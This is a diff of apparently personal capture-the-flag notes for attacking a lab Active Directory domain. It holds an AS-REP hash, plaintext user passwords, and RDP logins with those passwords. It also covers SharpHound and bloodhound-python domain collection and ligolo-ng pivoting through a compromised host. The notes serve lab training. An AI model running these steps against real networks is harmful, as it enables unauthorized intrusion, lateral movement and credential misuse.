@@ -710,7 +710,7 @@ $krb5asrep$23$qw2.amy.young@AI.VANCHAT.LOC:0a285adc5274265cf83fd60968bb564c$a3cd
 
 
 //RDP
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.11:3389 /u:qw2.amy.young /p:'password1!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.11:3389 /d:ai.vanchat.loc /u:qw2.amy.young /p:'password1!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
 //Success!!!
 
@@ -884,34 +884,64 @@ Credential : _4v41yVd$!DW
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+//RDP into Brian Singh
+xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.101:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
-// Try BloodHound (THIS NEEDS WORK)
+// BloodHound 
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+sudo apt install bloodhound
+sudo updatedb
+
+//Create Working Directory
+cd /home/kali/haxterm/data/SideQuest0/2-server1/
+mkdir bloodhound; cd bloodhound
+
 locate SharpHound.exe
-/usr/share/metasploit-framework/data/post/SharpHound.exe
-
-mkdir bloodhound
-cd bloodhound
-
-cp /usr/share/metasploit-framework/data/post/SharpHound.exe .
+cp /usr/share/sharphound/SharpHound.exe .
 
 //From a powershell in the ShareDrive
-SharpHound.exe -c All --zipfilename loot.zip
+.\SharpHound.exe -c All --zipfilename loot_AI.zip
 
-//This will take some time!
+This created the file:
+//20260323030043_loot_AI.zip
 
-//Start BloodHound locally
-sudo apt install neo4j
-sudo neo4j console
+#EXTRA: For most detail toward finding an attack path:
+.\SharpHound.exe -c All,GPOLocalGroup --loop --loopduration 00:05:00 --loopinterval 00:00:30 --zipfilename loot_AI_full.zip
+//The --loop flags re-run session collection repeatedly to catch more logged-on users.
 
-//Open Browser
-http://localhost:7474
 
-//DefaultCreds
-neo4j / neo4j
+//This will take some time!!!
 
-//Launch BloodHound
-bloodhound
+
+#EXTRA: Run BloodHound.py from Kali
+//If you have valid credentials but don't want to (or can't) drop a binary, use the Python collector entirely from Kali:
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+pip3 install bloodhound
+# OR
+sudo apt install python3-bloodhound
+
+bloodhound-python \
+  -u 'username' \
+  -p 'password' \
+  -d domain.local \
+  -ns <DC_IP> \
+  -c All \
+  --zip
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//Load into BloodHound on Kali
+# Start neo4j first
+sudo neo4j start
+
+# Then launch BloodHound
+sudo bloodhound &
+
+//Log in
+//(default creds: neo4j / neo4j)
+//You'll be prompted to change password, then drag-and-drop the .zip into the BloodHound UI.
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -946,17 +976,19 @@ bloodhound
 
 // SETUP
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+cd ~/haxterm/data/SideQuest0/1-db
 
 chmod 600 malhare_ed25519
 ssh -MS db -i malhare_ed25519 xGh05t@10.200.171.11
 
 // Ligolo-ng SET-UP
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+cd ~/haxterm/data/SideQuest0/1-db
+
 sudo apt install ligolo-ng
 
 //CreateWorkingDir
-mkdir proxy
-cd proxy
+mkdir proxy; cd proxy
 
 //1. StartProxy(Kali)
 sudo ligolo-proxy -selfcert
@@ -969,6 +1001,8 @@ You should now see:
 Listening on 0.0.0.0:11601
 
 //2. Transfer Agent to Target
+cd /home/kali/haxterm/data/SideQuest0/1-db
+
 which ligolo-agent
 /usr/bin/ligolo-agent
 
@@ -988,7 +1022,9 @@ start
 sudo ip route add 10.200.171.101/32 dev ligolo
 sudo ip route add 10.200.171.122/32 dev ligolo
 
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.101:3389 /u:qw2.amy.young /p:'password1!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+
+xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.101:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
+
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
